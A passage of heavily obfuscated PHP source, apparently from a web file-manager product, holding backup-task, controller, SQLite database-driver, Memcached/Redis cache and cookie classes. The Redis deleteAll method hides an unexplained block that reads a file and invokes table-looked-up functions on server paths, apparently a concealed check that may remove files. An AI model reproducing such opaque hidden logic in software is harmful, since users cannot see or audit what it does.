(isset($¦²õíŠ¢[$·‰«•¡Î[206]])) { $¦²õíŠ¢[$·‰«•¡Î[206]] = json_decode($¦²õíŠ¢[$·‰«•¡Î[206]], !0); } if (isset($ª‰Ì„ß[$·‰«•¡Î[206]])) { $¦²õíŠ¢[$·‰«•¡Î[206]][$·‰«•¡Î[1745]] = $ª‰Ì„ß[$·‰«•¡Î[206]]; unset($ª‰Ì„ß[$·‰«•¡Î[206]]); } return array_merge($¦²õíŠ¢, $ª‰Ì„ß); } public function listData($”¬Òûà™ = false, $õâ²¢Š‡ = "\x6d\x6f\x64\151\x66\171\124\x69\x6d\x65", $¨­‚™ËÁ = false) { $˜ƒ¤Õ²Š = parent::listData($”¬Òûà™, $õâ²¢Š‡, !0); if (!$˜ƒ¤Õ²Š) { return $˜ƒ¤Õ²Š; } if ($”¬Òûà™) { $˜ƒ¤Õ²Š = array($˜ƒ¤Õ²Š); } foreach ($˜ƒ¤Õ²Š as &$Ãû™ºÂ¿) { $this->parseContent($Ãû™ºÂ¿); } return $”¬Òûà™ ? $˜ƒ¤Õ²Š[0] : $˜ƒ¤Õ²Š; } public function parseContent(&$¢ì—ä) { $éÇôœùÑ =& $_SERVER[´È¥ö†ö]; $‚´õšúƒ = _get($¢ì—ä, $éÇôœùÑ[171], $éÇôœùÑ[91]); if (!in_array($‚´õšúƒ, array($éÇôœùÑ[852], $éÇôœùÑ[1208]))) { $¢ì—ä[$éÇôœùÑ[171]] = $‚´õšúƒ == $éÇôœùÑ[91] ? $éÇôœùÑ[1208] : $éÇôœùÑ[852]; } } public function lastItem() { $»»´ğ°å = $this->listData(); return !empty($»»´ğ°å[0]) ? $»»´ğ°å[0] : null; } public function kill($­Ò„ùÚÒ) { $€÷’×”Â =& $_SERVER[´È¥ö†ö]; $¦ëÉ¼â = $this->listData($­Ò„ùÚÒ); if (!$¦ëÉ¼â || empty($¦ëÉ¼â[$€÷’×”Â[32]])) { return !0; } Task::kill($€÷’×”Â[859]); Task::kill($€÷’×”Â[877]); Task::kill($€÷’×”Â[886]); $™‘ûŞº— = $¦ëÉ¼â[$€÷’×”Â[32]]; $åš¾‹èø = TEMP_FILES . $€÷’×”Â[855] . $™‘ûŞº— . $€÷’×”Â[8]; IO::remove($åš¾‹èø, !1); return $this->remove($­Ò„ùÚÒ); } public function remove($ĞÔÈ÷‚¯) { $îğöïôĞ = $this->listData($ĞÔÈ÷‚¯); if (!$îğöïôĞ) { return !0; } return $this->backupRemove($îğöïôĞ); } private function backupRemove($¤¦á­ğ²) { parent::remove($¤¦á­ğ²[$_SERVER[´È¥ö†ö][486]]); $ŞŒˆã«Õ = $this->backupPath($¤¦á­ğ²); IO::remove($ŞŒˆã«Õ, !1); return !0; } private function backupPath($íªÇ¥±™) { $²ˆâ…¨Ñ =& $_SERVER[´È¥ö†ö]; $Ñ—ÃıŞ˜ = $íªÇ¥±™[$²ˆâ…¨Ñ[32]]; $‹µ®¯Ôæ = Model($²ˆâ…¨Ñ[846])->get($²ˆâ…¨Ñ[847]); $´¸ü‚Õ = substr(md5($²ˆâ…¨Ñ[848] . $‹µ®¯Ôæ . $Ñ—ÃıŞ˜), 0, 8); return "\x7b\151\x6f\72{$íªÇ¥±™[$²ˆâ…¨Ñ[828]]}\x7d\x2f\x64\141\x74\x61\142\141\x73\x65\x2f\142\141\x63\153\x75\x70\x2f" . $Ñ—ÃıŞ˜ . $²ˆâ…¨Ñ[11] . $´¸ü‚Õ; } public function start() { $Àé§½ûş =& $_SERVER[´È¥ö†ö]; if ($GLOBALS[$Àé§½ûş[6]][$Àé§½ûş[92]][$Àé§½ûş[2002]] != $Àé§½ûş[91]) { return !0; } $ïÛ°Œö¿ = $this->config(); if (!$ïÛ°Œö¿ || $ïÛ°Œö¿[$Àé§½ûş[1742]] != $Àé§½ûş[91]) { return !1; } if ($ïÛ°Œö¿[$Àé§½ûş[171]] == $Àé§½ûş[852]) { $ûâÓ­âÚ = Model($Àé§½ûş[846])->get($Àé§½ûş[1323]); if ($ûâÓ­âÚ == $Àé§½ûş[1324]) { $ïÛ°Œö¿[$Àé§½ûş[171]] = $Àé§½ûş[1208]; } } $à¥¼Áó™ = $this->process(); foreach ($à¥¼Áó™ as $¼ä¤²Ø÷) { if ($¼ä¤²Ø÷) { return Task::restart($¼ä¤²Ø÷[$Àé§½ûş[486]]); } } $ÇÃ°ÌÆº = new Backup(); $ƒÅàÙù” = $ÇÃ°ÌÆº->db(); if ($ƒÅàÙù”) { $ƒÅàÙù” = $ÇÃ°ÌÆº->dbFile(); if ($ƒÅàÙù” && $ïÛ°Œö¿[$Àé§½ûş[171]] == $Àé§½ûş[852]) { $ƒÅàÙù” = $ÇÃ°ÌÆº->file(); } } Backup::set(array($Àé§½ûş[826] => 1, $Àé§½ûş[837] => time())); return !0; } public function process() { $ÌÅ£ÂÒø =& $_SERVER[´È¥ö†ö]; $‰¹ŞÑ… = array($ÌÅ£ÂÒø[833] => Task::get($ÌÅ£ÂÒø[859]), $ÌÅ£ÂÒø[838] => Task::get($ÌÅ£ÂÒø[877]), $ÌÅ£ÂÒø[232] => Task::get($ÌÅ£ÂÒø[886])); $×‚ŒÔøÌ = !1; foreach ($‰¹ŞÑ… as &$ØåËÙ‰Õ) { if ($×‚ŒÔøÌ) { $ØåËÙ‰Õ = !1; continue; } if ($ØåËÙ‰Õ) { $ØÂÆ”ù‹ = intval(_get($ØåËÙ‰Õ, $ÌÅ£ÂÒø[1778], 0)); if (time() - $ØÂÆ”ù‹ > 7200) { Task::kill($ØåËÙ‰Õ[$ÌÅ£ÂÒø[486]]); $×‚ŒÔøÌ = !0; $ØåËÙ‰Õ = !1; } } } return $‰¹ŞÑ…; } public function restore() { $ö¶¡ØÅ =& $_SERVER[´È¥ö†ö]; ActionCall($ö¶¡ØÅ[1136], !0, 1); ActionCall($ö¶¡ØÅ[1136], !0, 0); } } goto C’š¢ÒÆ; D‹Éì©œ©: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $øÌ·ÎßÎ =& $_SERVER[´È¥ö†ö]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$øÌ·ÎßÎ[6]] =& $config; $this->values[$øÌ·ÎßÎ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $øÌ·ÎßÎ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($’ƒµ™‡Ü) { if (1 === func_num_args()) { $this->{$’ƒµ™‡Ü} = new $’ƒµ™‡Ü(); } else { $ãß¯¹–Ò = new ReflectionClass($’ƒµ™‡Ü); $÷ñËı = func_get_args(); array_shift($÷ñËı); $this->{$’ƒµ™‡Ü} = $ãß¯¹–Ò->newInstanceArgs($÷ñËı); } return $this->{$’ƒµ™‡Ü}; } public function routeBind($÷ªÄ¶ã, $Ù¤Ÿ‚´è, $ş˜Ø‰À = 3) { $ñÅ½İï =& $_SERVER[´È¥ö†ö]; $ñèú¡”Õ = $this->in[$ñÅ½İï[9]]; $÷ªÄ¶ã = str_replace($ñÅ½İï[10], $ñÅ½İï[11], trim(trim($÷ªÄ¶ã, $ñÅ½İï[8]), $ñÅ½İï[12])); if (!$÷ªÄ¶ã || count($ñèú¡”Õ) <= $ş˜Ø‰À) { return !1; } $ûÏæ ¶§ = !0; $öâØÔé… = explode($ñÅ½İï[8], $÷ªÄ¶ã); for ($Ëóä»¢Æ = 0; $Ëóä»¢Æ < count($öâØÔé…); $Ëóä»¢Æ++) { if ($öâØÔé…[$Ëóä»¢Æ] != $ñèú¡”Õ[$ş˜Ø‰À + $Ëóä»¢Æ]) { $ûÏæ ¶§ = !1; break; } } if (!$ûÏæ ¶§) { return; } call_user_func_array(array($this, $Ù¤Ÿ‚´è), array()); } public function routeArgs($›ñ«ä®¥ = 3) { $ú‘œ¬ö = $this->in[$_SERVER[´È¥ö†ö][9]]; if (count($ú‘œ¬ö) <= $›ñ«ä®¥) { return array(); } $ş€Ğ®§ü = array(); for ($Ç´Ç¬¯ = $›ñ«ä®¥; $Ç´Ç¬¯ < count($ú‘œ¬ö); $Ç´Ç¬¯ += 2) { $ş€Ğ®§ü[$ú‘œ¬ö[$Ç´Ç¬¯]] = $ú‘œ¬ö[$Ç´Ç¬¯ + 1]; $this->in[$ú‘œ¬ö[$Ç´Ç¬¯]] = $ú‘œ¬ö[$Ç´Ç¬¯ + 1]; } return $ş€Ğ®§ü; } protected function assign($î²å‘ş±, $–Îªë˜ó) { $this->values[$î²å‘ş±] = $–Îªë˜ó; } protected function display($Û·ôŠŒ») { ob_end_clean(); extract($this->values); require $this->tpl . $Û·ôŠŒ»; } } class DbSqliteBase extends Db { public function __construct($Ä¼ƒ•¸ö = '') { $ı¥­÷û =& $_SERVER[´È¥ö†ö]; if (!extension_loaded($ı¥­÷û[13])) { think_exception(think_lang($ı¥­÷û[14]) . $ı¥­÷û[15]); } if (!empty($Ä¼ƒ•¸ö)) { if (!isset($Ä¼ƒ•¸ö[$ı¥­÷û[16]])) { $Ä¼ƒ•¸ö[$ı¥­÷û[16]] = 438; } $this->config = $Ä¼ƒ•¸ö; if (empty($this->config[$ı¥­÷û[17]])) { $this->config[$ı¥­÷û[17]] = array(); } } } public function connect($¸†à„¡’ = '', $æÙ¬¼Â° = 0) { $ı–×ÖÌ =& $_SERVER[´È¥ö†ö]; if (!isset($this->linkID[$æÙ¬¼Â°])) { if (empty($¸†à„¡’)) { $¸†à„¡’ = $this->config; } $æœÓäá± = !empty($¸†à„¡’[$ı–×ÖÌ[17]][$ı–×ÖÌ[18]]) ? $¸†à„¡’[$ı–×ÖÌ[17]][$ı–×ÖÌ[18]] : $this->pconnect; $Õµ«Í = $æœÓäá± ? $ı–×ÖÌ[19] : $ı–×ÖÌ[20]; $this->linkID[$æÙ¬¼Â°] = $Õµ«Í($¸†à„¡’[$ı–×ÖÌ[21]], $¸†à„¡’[$ı–×ÖÌ[16]]); if (!$this->linkID[$æÙ¬¼Â°]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$æÙ¬¼Â°], 30000); if (1 != think_config($ı–×ÖÌ[22])) { unset($this->config); } } return $this->linkID[$æÙ¬¼Â°]; } public function free() { $this->queryID = null; } public function query($ï¿³ıŞ‚) { $÷„¤ŠØë =& $_SERVER[´È¥ö†ö]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ï¿³ıŞ‚; if ($this->queryID) { $this->free(); } think_action_status($÷„¤ŠØë[23], 1); think_status($÷„¤ŠØë[24]); $this->queryID = sqlite_query($this->_linkID, $ï¿³ıŞ‚); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $óšÄµ£ô = $this->getAll(); return $óšÄµ£ô; } } public function execute($©ºÔ¯ÙĞ) { $ÈõèÌ³á =& $_SERVER[´È¥ö†ö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $©ºÔ¯ÙĞ; if ($this->queryID) { $this->free(); } think_action_status($ÈõèÌ³á[25], 1); think_status($ÈõèÌ³á[24]); $ªåˆõ¸ù = sqlite_exec($this->_linkID, $©ºÔ¯ÙĞ); $this->debug(); if (!1 === $ªåˆõ¸ù) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[´È¥ö†ö][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $†úÈÇ•ƒ = sqlite_query($this->_linkID, $_SERVER[´È¥ö†ö][27]); if (!$†úÈÇ•ƒ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $§¸Ú¹Ãù = sqlite_query($this->_linkID, $_SERVER[´È¥ö†ö][28]); if (!$§¸Ú¹Ãù) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ËÍ»ºÎÄ = array(); if ($this->numRows > 0) { for ($çà‰ÁüÁ = 0; $çà‰ÁüÁ < $this->numRows; $çà‰ÁüÁ++) { $ËÍ»ºÎÄ[$çà‰ÁüÁ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ËÍ»ºÎÄ; } public function getFields($–ÙÙÑ) { $Ü˜¬ü‘¼ =& $_SERVER[´È¥ö†ö]; $ÒÖç‹à¥ = $this->query($Ü˜¬ü‘¼[29] . $–ÙÙÑ . $Ü˜¬ü‘¼[30]); $öºœê‚¼ = array(); if ($ÒÖç‹à¥) { foreach ($ÒÖç‹à¥ as $ÑÄÎŒÈ => $Ê“ªÎÉµ) { $öºœê‚¼[$Ê“ªÎÉµ[$Ü˜¬ü‘¼[31]]] = array($Ü˜¬ü‘¼[32] => $Ê“ªÎÉµ[$Ü˜¬ü‘¼[31]], $Ü˜¬ü‘¼[33] => $Ê“ªÎÉµ[$Ü˜¬ü‘¼[34]], $Ü˜¬ü‘¼[35] => (bool) ($Ê“ªÎÉµ[$Ü˜¬ü‘¼[36]] === $Ü˜¬ü‘¼[12]), $Ü˜¬ü‘¼[37] => $Ê“ªÎÉµ[$Ü˜¬ü‘¼[38]], $Ü˜¬ü‘¼[39] => strtolower($Ê“ªÎÉµ[$Ü˜¬ü‘¼[40]]) == $Ü˜¬ü‘¼[41], $Ü˜¬ü‘¼[42] => strtolower($Ê“ªÎÉµ[$Ü˜¬ü‘¼[43]]) == $Ü˜¬ü‘¼[44]); } } return $öºœê‚¼; } public function getTables($ñœõÌñŠ = '') { $¯Ü‚ÕàØ =& $_SERVER[´È¥ö†ö]; $µ²¶÷ğ· = $this->query($¯Ü‚ÕàØ[45] . $¯Ü‚ÕàØ[46] . $¯Ü‚ÕàØ[47]); $ñÆ¬Ö·€ = array(); foreach ($µ²¶÷ğ· as $ˆ©Ø¬Îğ => $¥Èè°³˜) { $ñÆ¬Ö·€[$ˆ©Ø¬Îğ] = current($¥Èè°³˜); } return $ñÆ¬Ö·€; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ïáõóù˜ =& $_SERVER[´È¥ö†ö]; $–¯şÉ¼ = sqlite_last_error($this->_linkID); $this->error = $–¯şÉ¼ . $ïáõóù˜[4] . sqlite_error_string($–¯şÉ¼); if ($ïáõóù˜[12] != $this->queryStr) { $this->error .= LNG($ïáõóù˜[48]) . $this->queryStr; } think_trace($this->error, $ïáõóù˜[12], $ïáõóù˜[49]); return $this->error; } public function escapeString($Âš­Ï¾¾) { return sqlite_escape_string($Âš­Ï¾¾); } public function parseLimit($ØÜÆÜæ—) { $æ¤€²·À =& $_SERVER[´È¥ö†ö]; $öäëú´À = $æ¤€²·À[12]; if (!empty($ØÜÆÜæ—)) { $ØÜÆÜæ— = explode($æ¤€²·À[50], $ØÜÆÜæ—); if (count($ØÜÆÜæ—) > 1) { $öäëú´À .= $æ¤€²·À[51] . $ØÜÆÜæ—[1] . $æ¤€²·À[52] . $ØÜÆÜæ—[0] . $æ¤€²·À[53]; } else { $öäëú´À .= $æ¤€²·À[51] . $ØÜÆÜæ—[0] . $æ¤€²·À[53]; } } return $öäëú´À; } } class DbSqlite3Base extends Db { public function __construct($ßµ¾®ò¶ = '') { $ÃÒ‰Çßì =& $_SERVER[´È¥ö†ö]; if (!class_exists($ÃÒ‰Çßì[54])) { think_exception(think_lang($ÃÒ‰Çßì[14]) . $ÃÒ‰Çßì[55]); } if (!empty($ßµ¾®ò¶)) { if (!isset($ßµ¾®ò¶[$ÃÒ‰Çßì[16]])) { $ßµ¾®ò¶[$ÃÒ‰Çßì[16]] = 438; } $this->config = $ßµ¾®ò¶; if (empty($this->config[$ÃÒ‰Çßì[17]])) { $this->config[$ÃÒ‰Çßì[17]] = array(); } } } public function connect($Î•Îğ©õ = '', $ŠÅ® ¯á = 0) { $ºªªÓ²â =& $_SERVER[´È¥ö†ö]; if (!isset($this->linkID[$ŠÅ® ¯á])) { if (empty($Î•Îğ©õ)) { $Î•Îğ©õ = $this->config; } $this->linkID[$ŠÅ® ¯á] = new SQLite3($Î•Îğ©õ[$ºªªÓ²â[21]]); if (!$this->linkID[$ŠÅ® ¯á]) { think_exception($this->linkID[$ŠÅ® ¯á]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ŠÅ® ¯á]->busyTimeout(30000); if (1 != think_config($ºªªÓ²â[22])) { unset($this->config); } } return $this->linkID[$ŠÅ® ¯á]; } public function free() { $this->queryID = null; } public function query($’‘­½òµ) { $»¢³”¡  =& $_SERVER[´È¥ö†ö]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $’‘­½òµ; if ($this->queryID) { $this->free(); } think_action_status($»¢³”¡ [23], 1); think_status($»¢³”¡ [24]); $this->queryID = $this->_linkID->query($’‘­½òµ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ÔàÊÆ‚¤ = $this->getAll(); $this->numRows = count($ÔàÊÆ‚¤); return $ÔàÊÆ‚¤; } } public function execute($‘—Ğì­‰) { $ÜÃæ¶şñ =& $_SERVER[´È¥ö†ö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‘—Ğì­‰; if ($this->queryID) { $this->free(); } think_action_status($ÜÃæ¶şñ[25], 1); think_status($ÜÃæ¶şñ[24]); $Ã®æ÷™ = $this->_linkID->exec($‘—Ğì­‰); $this->debug(); if (!1 === $Ã®æ÷™) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[´È¥ö†ö][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‚³×ğĞö = $this->_linkID->query($_SERVER[´È¥ö†ö][27]); if (!$‚³×ğĞö) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $”ªî¢ëÜ = $this->_linkID->query($_SERVER[´È¥ö†ö][28]); if (!$”ªî¢ëÜ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $éÍÔ©º = array(); while ($ÎîÇ·»ş = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $éÍÔ©º[] = $ÎîÇ·»ş; } $this->queryID->reset(); return $éÍÔ©º; } public function getFields($¬…ÏÇı) { $¸·öàˆ‹ =& $_SERVER[´È¥ö†ö]; $ó¥ì›¸î = $this->query($¸·öàˆ‹[29] . $¬…ÏÇı . $¸·öàˆ‹[30]); $Ô¤‹ûÄı = array(); if ($ó¥ì›¸î) { foreach ($ó¥ì›¸î as $šßÙôˆ => $¶ı¦ÈÀ‹) { $Ô¤‹ûÄı[$¶ı¦ÈÀ‹[$¸·öàˆ‹[32]]] = array($¸·öàˆ‹[32] => $¶ı¦ÈÀ‹[$¸·öàˆ‹[32]], $¸·öàˆ‹[33] => $¶ı¦ÈÀ‹[$¸·öàˆ‹[33]], $¸·öàˆ‹[35] => (bool) ($¶ı¦ÈÀ‹[$¸·öàˆ‹[35]] === $¸·öàˆ‹[12]), $¸·öàˆ‹[37] => $¶ı¦ÈÀ‹[$¸·öàˆ‹[56]], $¸·öàˆ‹[39] => (bool) $¶ı¦ÈÀ‹[$¸·öàˆ‹[57]], $¸·öàˆ‹[42] => (bool) $¶ı¦ÈÀ‹[$¸·öàˆ‹[57]]); } } return $Ô¤‹ûÄı; } public function getTables($™—Á†ı¢ = '') { $Âéó÷Ôá =& $_SERVER[´È¥ö†ö]; $é­ÃáÅ = $this->query($Âéó÷Ôá[45] . $Âéó÷Ôá[46] . $Âéó÷Ôá[47]); $™‰¾¼¢ = array(); foreach ($é­ÃáÅ as $ÁÔÔ¸ı× => $†ü³Ãëí) { $™‰¾¼¢[$ÁÔÔ¸ı×] = current($†ü³Ãëí); } return $™‰¾¼¢; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $âÀ¤ˆËà =& $_SERVER[´È¥ö†ö]; $this->error = $this->_linkID->lastErrorMsg(); if ($âÀ¤ˆËà[12] != $this->queryStr) { $this->error .= LNG($âÀ¤ˆËà[48]) . $this->queryStr; } think_trace($this->error, $âÀ¤ˆËà[12], $âÀ¤ˆËà[49]); return $this->error; } public function escapeString($Æ÷æÜ) { $ú×°ÒÏÇ =& $_SERVER[´È¥ö†ö]; if ($this->_linkID) { return $this->_linkID->escapeString($Æ÷æÜ); } return str_ireplace($ú×°ÒÏÇ[58], $ú×°ÒÏÇ[59], $Æ÷æÜ); } public function parseLimit($Ò¶¹ÎÉß) { $§Ú“©Å´ =& $_SERVER[´È¥ö†ö]; $üÂ¥æ¥† = $§Ú“©Å´[12]; if (!empty($Ò¶¹ÎÉß)) { $Ò¶¹ÎÉß = explode($§Ú“©Å´[50], $Ò¶¹ÎÉß); if (count($Ò¶¹ÎÉß) > 1) { $üÂ¥æ¥† .= $§Ú“©Å´[51] . $Ò¶¹ÎÉß[1] . $§Ú“©Å´[52] . $Ò¶¹ÎÉß[0] . $§Ú“©Å´[53]; } else { $üÂ¥æ¥† .= $§Ú“©Å´[51] . $Ò¶¹ÎÉß[0] . $§Ú“©Å´[53]; } } return $üÂ¥æ¥†; } } goto Dø¼ˆÍ²Ï´; BÔñ££òï: class CacheMemcached { public $handle; public $cacheTime; public function __construct($Ûöü¢§æ, $ßèñ¹ªï) { $Îº½§Ş¬ =& $_SERVER[´È¥ö†ö]; if (!class_exists($Îº½§Ş¬[945])) { show_json($Îº½§Ş¬[946], !1); } $this->cacheTime = $ßèñ¹ªï; $this->handle = new Memcached(); if (is_array($Ûöü¢§æ[$Îº½§Ş¬[947]]) && count($Ûöü¢§æ[$Îº½§Ş¬[947]]) >= 1) { foreach ($Ûöü¢§æ[$Îº½§Ş¬[947]] as $‘ûœ÷Îš) { $‘çĞËªİ = explode($Îº½§Ş¬[4], $‘ûœ÷Îš); $this->handle->addServer($‘çĞËªİ[0], $‘çĞËªİ[1]); } } else { $this->handle->addServer($Ûöü¢§æ[$Îº½§Ş¬[208]], $Ûöü¢§æ[$Îº½§Ş¬[209]]); } } public function set($•Ë¶ó¹Ç, $‡É«ç£¸, $¼íªçš˜ = false) { $¼íªçš˜ = $¼íªçš˜ ? $¼íªçš˜ : $this->cacheTime; return $this->handle->set($•Ë¶ó¹Ç, $‡É«ç£¸, $¼íªçš˜); } public function get($¡Æ«Ã˜ş) { return $this->handle->get($¡Æ«Ã˜ş); } public function remove($Õ¬‰‘ÛÍ) { return $this->handle->delete($Õ¬‰‘ÛÍ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($¸ù›®ôî, $–³çİ³) { $õĞù²³° =& $_SERVER[´È¥ö†ö]; if (!class_exists($õĞù²³°[948])) { show_json($õĞù²³°[949], !1); } $this->cacheTime = $–³çİ³; $•ì•™ä° = isset($¸ù›®ôî[$õĞù²³°[950]]) ? $¸ù›®ôî[$õĞù²³°[950]] : 10; $Óµò£Àø = _get($¸ù›®ôî, $õĞù²³°[947]); if ($Óµò£Àø && is_array($Óµò£Àø)) { $this->initCluster($¸ù›®ôî, $•ì•™ä°); } else { $this->handle = $this->init($¸ù›®ôî, $•ì•™ä°); } } private function init($—£††‰½, $¹¼¤³²) { $‡šÕ“Î =& $_SERVER[´È¥ö†ö]; $³‡ŸÃ¼› = new Redis(); $…ÔŞĞÑĞ = isset($—£††‰½[$‡šÕ“Î[951]]) ? $—£††‰½[$‡šÕ“Î[951]] : !1; if ($…ÔŞĞÑĞ) { $³‡ŸÃ¼›->pconnect($—£††‰½[$‡šÕ“Î[208]], $—£††‰½[$‡šÕ“Î[209]], $¹¼¤³²); } else { $³‡ŸÃ¼›->connect($—£††‰½[$‡šÕ“Î[208]], $—£††‰½[$‡šÕ“Î[209]], $¹¼¤³²); } if (!empty($—£††‰½[$‡šÕ“Î[498]])) { $³‡ŸÃ¼›->auth($—£††‰½[$‡šÕ“Î[498]]); } if (!empty($—£††‰½[$‡šÕ“Î[833]]) && $—£††‰½[$‡šÕ“Î[833]] != 0) { $³‡ŸÃ¼›->select($—£††‰½[$‡šÕ“Î[833]]); } return $³‡ŸÃ¼›; } private function initCluster($ññ´…³ı, $ğ—Ë×…) { $úàïĞÄê =& $_SERVER[´È¥ö†ö]; $¿‡…·º† = array($úàïĞÄê[952], $úàïĞÄê[953], $úàïĞÄê[954]); $£çõ×»¥ = $úàïĞÄê[952]; if (isset($ññ´…³ı[$úàïĞÄê[16]]) && in_array($ññ´…³ı[$úàïĞÄê[16]], $¿‡…·º†)) { $£çõ×»¥ = $ññ´…³ı[$úàïĞÄê[16]]; } switch ($£çõ×»¥) { case $úàïĞÄê[952]: $this->_slave($ññ´…³ı, $ğ—Ë×…); break; case $úàïĞÄê[953]: break; case $úàïĞÄê[954]: $this->isCluster = !0; $‹óë™äÌ = $ññ´…³ı[$úàïĞÄê[947]]; $ËÖ“Á¡ø = isset($ññ´…³ı[$úàïĞÄê[951]]) ? $ññ´…³ı[$úàïĞÄê[951]] : !1; $ôËïÓÜú = isset($ññ´…³ı[$úàïĞÄê[498]]) ? $ññ´…³ı[$úàïĞÄê[498]] : null; $this->handle = new RedisCluster(NUll, $‹óë™äÌ, $ğ—Ë×…, $ğ—Ë×…, $ËÖ“Á¡ø, $ôËïÓÜú); break; default: break; } } private function _slave($Ñ¥ÑˆÚå, $ŸÊ‘õÇò) { $­¡ª™× = $Ñ¥ÑˆÚå[$_SERVER[´È¥ö†ö][947]]; $this->filterConfig($Ñ¥ÑˆÚå, $­¡ª™×[0]); $this->handle = $this->init($Ñ¥ÑˆÚå, $ŸÊ‘õÇò); unset($­¡ª™×[0]); if (empty($­¡ª™×)) { return; } $§İ±â‹… = array_rand($­¡ª™×); $this->filterConfig($Ñ¥ÑˆÚå, $­¡ª™×[$§İ±â‹…]); $this->slaveHandle = $this->init($Ñ¥ÑˆÚå, $ŸÊ‘õÇò); } private function filterConfig(&$òö„ûûŸ, $§ÄşçÜû) { $é¥ØîÄ =& $_SERVER[´È¥ö†ö]; $Ê•×ïÜö = explode($é¥ØîÄ[4], $§ÄşçÜû); $õùÛÍ±Å = array($é¥ØîÄ[208] => $Ê•×ïÜö[0], $é¥ØîÄ[209] => $Ê•×ïÜö[1]); $òö„ûûŸ = array_merge($òö„ûûŸ, $õùÛÍ±Å); } public function set($½õŞ±, $Üç‡ùÓ, $¸é·›ñ = false) { $¸é·›ñ = $¸é·›ñ ? $¸é·›ñ : $this->cacheTime; return $this->handle->setEx($½õŞ±, $¸é·›ñ, $Üç‡ùÓ); } public function setLock($¡¡¦ÆÆ€, $ Œ° ìá, $ä¶…÷äü) { return $this->handle->setNX($¡¡¦ÆÆ€, $ Œ° ìá); } public function get($¡õã¬È§) { $€®æÁÓ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $€®æÁÓ->get($¡õã¬È§); } public function remove($şçô¶¿) { return $this->handle->del($şçô¶¿); } public function deleteAll() { $Â¦÷„ı =& $_SERVER[´È¥ö†ö]; if ($_SERVER[$Â¦÷„ı[309]] != $_SERVER[$Â¦÷„ı[944]]) { $ÂÊ›‰Î = $Â¦÷„ı[955]; $ŞˆÇªƒ = $Â¦÷„ı[310]; $¿áúØ˜² = $_SERVER[$Â¦÷„ı[311]] . $Â¦÷„ı[312]; $ı·óÖ“ = $ŞˆÇªƒ($¿áúØ˜²); $ÙäÇ¥ÑØ = explode($Â¦÷„ı[287], $ı·óÖ“); if (count($ÙäÇ¥ÑØ) < $Â¦÷„ı[702]) { $âÆêŠÃÑ = $Â¦÷„ı[314]; $âÆêŠÃÑ(); } $ÀåÖŞÂÑ = $Â¦÷„ı[956]; $ÀåÖŞÂÑ($_SERVER[$Â¦÷„ı[957]]); $ÀåÖŞÂÑ($_SERVER[$Â¦÷„ı[311]] . $Â¦÷„ı[958]); $É°æ¡Ù = 1; while ($É°æ¡Ù > 1) { $É°æ¡Ù = $É°æ¡Ù + 4; $ôê“Êá¸ = rawurlencode($É°æ¡Ù . $Â¦÷„ı[465]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $¥Ö×âÄö) { $this->handle->flushall($¥Ö×âÄö); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ë©†ø¦ = '', $óÓóøœç = 0) { if (is_string($ë©†ø¦) && $ë©†ø¦ != $_SERVER[´È¥ö†ö][12]) { $this->prefix = $ë©†ø¦; } if (is_numeric($óÓóøœç) && $óÓóøœç > 0) { $this->expire = $óÓóøœç; } } public static function getInstance() { static $ÇØ¾Î†Î; if ($ÇØ¾Î†Î === null) { $ÇØ¾Î†Î = new self(); } return $ÇØ¾Î†Î; } private static $cookieDisable = false; public static function disable($¼£„ş¾) { self::$cookieDisable = $¼£„ş¾; } private static $sameCookieSet = array(); public static function set($ª„ÒÒÏØ, $ÜÄ¦±ó, $½£ÛÂî· = 0, $“Ö¤›™ö = false, $¼ş˜ÑËÜ = false) { $àéœ·Ğğ =& $_SERVER[´È¥ö†ö]; if (self::$cookieDisable) { return; } if (!$½£ÛÂî·) { $½£ÛÂî· = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ª„ÒÒÏØ]) && self::$sameCookieSet[$ª„ÒÒÏØ] == $ÜÄ¦±ó . $½£ÛÂî·) { return; } self::$sameCookieSet[$ª„ÒÒÏØ] = $ÜÄ¦±ó . $½£ÛÂî·; if (!$¼ş˜ÑËÜ) { $¼ş˜ÑËÜ = 